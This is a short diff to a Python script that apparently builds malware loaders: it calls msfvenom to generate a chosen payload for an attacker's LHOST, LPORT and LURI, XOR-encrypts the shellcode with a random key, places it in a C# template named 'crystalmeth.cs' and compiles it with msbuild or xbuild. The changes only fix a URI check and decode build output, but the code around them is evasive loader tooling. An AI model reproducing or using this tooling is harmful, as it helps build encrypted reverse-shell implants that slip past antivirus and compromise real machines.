@@ -38,7 +38,7 @@ waar = ''.join(random.choice(letters) for i in range(randint(4,8)))
 
 # Generate the shellcode given the preferred payload
 
-if args.luri:
+if args.luri and args.luri != "/":
     print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and  LURI={bcolors.OKGREEN}{args.luri}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
     msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", f"LURI={args.luri}", 'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel]
 else:
@@ -98,6 +98,6 @@ schrijven('raw/crystalmeth.cs', template)
 import shutil
 build_cmd = 'msbuild' if shutil.which('msbuild') else 'xbuild'
 result = subprocess.run([build_cmd, 'meuk/meth/meth.csproj'], stdout=subprocess.PIPE)
-print(result.stdout)
+print(result.stdout.decode('utf-8', errors='replace'))
 
 
